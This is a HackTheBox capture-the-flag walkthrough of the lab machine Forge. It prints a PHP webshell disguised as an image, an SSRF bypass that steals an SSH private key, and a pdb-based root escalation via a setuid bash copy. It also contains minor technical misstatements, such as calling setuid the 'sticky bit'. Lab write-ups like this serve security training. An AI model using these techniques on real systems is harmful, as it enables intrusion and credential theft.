---
title: "Walk-through of Forge from HackTheBox"
header:
  teaser: /assets/images/2021-10-24-15-05-16.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - pdb
---

## Machine Information

![forge](/assets/images/2021-10-24-15-05-16.png)

Forge is a medium machine on HackTheBox. We start with a simple website, after some enumeration and testing we find a way to upload a file allowing command execution on the box. We use this to exfiltrate an SSH private key which gives us user level access. Privilege escalation involves exploiting a vulnerable Python script and using pdb to gain a root shell.

<!--more-->

Skills required are web and OS enumeration knowledge. Skills learned are investigating and bypassing defences on a web server.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Forge](https://www.hackthebox.eu/home/machines/profile/376) |
| Machine Release Date | 11th September 2021 |
| Date I Completed It | 24th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/forge]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.111 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/forge]
└─# nmap -p$ports -sC -sV -oA forge 10.10.11.111
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-23 16:10 BST
Nmap scan report for 10.10.11.111
Host is up (0.025s latency).

PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

Not a lot to work on at first glance. Let's add the servers IP to our hosts file first:

```text
┌──(root💀kali)-[~/htb/forge]
└─# echo 10.10.11.111 forge.htb >> /etc/hosts
```

## Website Exploration

We have a simple static webpage with a gallery of pictures:

![forge-website](/assets/images/2021-10-23-16-15-37.png)

Nothing interesting there and the source code doesn't reveal anything either. We do have a link to upload an image:

![forge-upload-link](/assets/images/2021-10-24-12-10-36.png)

I tried clicking **Upload from url** and putting [http://admin.forge.htb](http://admin.forge.htb) in but got this:

![forge-url-blacklist](/assets/images/2021-10-23-16-46-50.png)

## Malicious File

So next I created a fake jpg to test for command execution:

```text
┌──(root💀kali)-[~/htb/forge]
└─# cat test.php.jpg
GIF89a;
<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
```

I clicked **Upload local file** and selected the file I've created above:

![forge-test-upload](/assets/images/2021-10-23-16-49-44.png)

Which seemed to work:

![forge-test-success](/assets/images/2021-10-23-16-50-06.png)

Checking I see the file was uploaded as I created it:

```text
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/IKExHjc8JZpazyGNcp02
GIF89a;
<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
```

## Gobuster

But it's not treated as a PHP file, so double extensions don't work. Time for some enumeration:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://forge.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forge.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/10/23 16:17:06 Starting gobuster in directory enumeration mode
===============================================================
http://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
http://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
http://forge.htb/upload               (Status: 200) [Size: 929]                                
http://forge.htb/server-status        (Status: 403) [Size: 274]                                
===============================================================
2021/10/23 16:23:46 Finished
===============================================================
```

I didn't find any interesting subfolders, next try vhosts:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://forge.htb -o results.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/23 16:26:24 Starting gobuster in VHOST enumeration mode
===============================================================
Found: helpdesk.forge.htb (Status: 302) [Size: 284]
Found: new.forge.htb (Status: 302) [Size: 279]     
Found: imap.forge.htb (Status: 302) [Size: 280]    
Found: vpn.forge.htb (Status: 302) [Size: 279]     
Found: localhost.forge.htb (Status: 302) [Size: 285]
Found: old.forge.htb (Status: 302) [Size: 279]      
Found: mail2.forge.htb (Status: 302) [Size: 281]    
Found: mx.forge.htb (Status: 302) [Size: 278]       
Found: wiki.forge.htb (Status: 302) [Size: 280]
<SNIP>
```

The output from this was very long with all the 302's but grepping it for a status code of 20x found this one:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# cat results.txt | grep "Status: 20"
Found: admin.forge.htb (Status: 200) [Size: 27]
```

## Admin Portal

Let's add to our hosts file:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# echo 10.10.11.111 admin.forge.htb >> /etc/hosts
```

Trying to browse to it gives this:

![forge-admin](/assets/images/2021-10-23-16-35-18.png)

After a lot of messing around with files and URLs I finally found that the blacklist is case sensitive, so this works:

![forge-uppercase](/assets/images/2021-10-23-17-13-49.png)

I haven't provided a file, just entered that admin subsite and we get this:

![forge-uppercase-works](/assets/images/2021-10-23-16-44-49.png)

However looking at it in the browser gives an error:

![forge-upload-error](/assets/images/2021-10-23-16-45-19.png)

## Admin Redirect

If we use curl instead we see the link is actually to an html page:

```html
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/v1QAG76SIORu2xq3wlC2
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

If we curl that we get the same message as before:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl http://ADMIN.FORGE.HTB/announcements
Only localhost is allowed!
```

## Bypassing Protection

If we put that address in the Upload from url box on the uploads page and submit we get another file:

![forge-announcements](/assets/images/2021-10-23-17-20-05.png)

Now if we curl that:

```html
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/clJnyG73Ygsheb7YVQ5v 
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as <HIDDEN></li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

## Upload Page

To save messing about in the browser I'll switch to using Curl from now on. Above we have been given FTP credentials, and a hint that we can access via /upload using the ?u= parameter. From the earlier scan we saw FTP is filtered, so can assume we need to access via the same webpage.

Here's how we do that using Curl:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@FORGE.HTB&remote=1' -X POST http://forge.htb/upload
```

From this we use -X to give the URL to the upload page, then we use -d to send the data we want to post. Here I've given it the FTP credentials.

The response looks good:

```html
<center>
    <strong>File uploaded successfully to the following url:</strong>
    </center>
    </h1>
    <h1>
        <center>
            <strong><a href="http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm">http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm</strong>
        </center>
```

We can see the contents of that is the home folder of the user:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm                                                                                 
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt
```

## Curl Enumeration

We can make this easier by passing the filename we get back from curl back to curl cutting out the bit we want:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2` 
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt
```

Now we can interact with it a bit easier. Let's get the user flag:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB/user.txt&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`
<HIDDEN>
```

## Data Exfiltration

I spent some time trying to find something useful, eventually remembering that you can't see hidden files in FTP. Could it be as simple as the user has a .ssh folder with a private key I can grab:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB/.ssh/id_rsa&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

Turns out it was that simple! Let's echo this in to a file on Kali so we can use it to connect via SSH:

```text
┌──(root💀kali)-[~/htb/forge]
└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----     
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
<SNIP>
-----END OPENSSH PRIVATE KEY-----
" > /root/htb/forge/id_rsa

┌──(root💀kali)-[~/htb/forge]
└─# chmod 600 id_rsa
```

## SSH Access

Now we can log in as user:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# ssh -i id_rsa user@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
Last login: Sat Oct 23 15:39:54 2021 from 10.10.15.24
-bash-5.0$ whoami
user
```

I checked sudo permissions first, and found our escalation path straight away:

```sh
-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

## Python Script

We can run a python script as root with no password. Let's check the script:

```python
-bash-5.0$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != '<HIDDEN>':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

We see it's a simple script that when run listens on a random port on localhost. When you connect to it you have a few options to view processes, memory or sockets. It even gives us the password! The key part is the except clause which drops us to the interactive source code debugger called [pdb](https://docs.python.org/3/library/pdb.html). If we trigger an exception we'll be at a Python prompt as root, so from there we can easily finish the box.

Let's run the script as root:

```sh
-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:49630
```

We see it's waiting for us to connect on port 49630. Let's log in from a second terminal as user via SSH again:

```sh
┌──(root💀kali)-[~/htb/forge]
└─# ssh -i id_rsa user@forge.htb                             
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
Last login: Sun Oct 24 10:10:40 2021 from 10.10.14.192
-bash-5.0$
```

Now we can connect to the script on localhost:

```sh
-bash-5.0$ nc localhost 49630
Enter the secret passsword: <HIDDEN>
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

## Root Flag

You can enter anything other than the four expected numbers. After that the script appears to hang, if you switch to your other terminal you'll see the script has crashed and you're now in the pdb:

```sh
invalid literal for int() with base 10: b'pencerwashere'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)
```

We saw the script imported the os module, so we can use that to execute system commands as root:

```text
(Pdb) import os
(Pdb) os.system ('cp /bin/bash /dev/shm/bash')
0
(Pdb) os.system ('chmod u+s /dev/shm/bash')
0
(Pdb) exit
```

There's lots of different things we could have done here, i've just copied bash to a temp area and added the sticky bit so I can run it as root without a password.

Now we can grab the root flag to complete the box:

```sh
-bash-5.0$ cd /dev/shm
-bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
<HIDDEN>
```

That was a pretty easy box to say it was classed as medium. I hope you enjoyed it, see you next time.
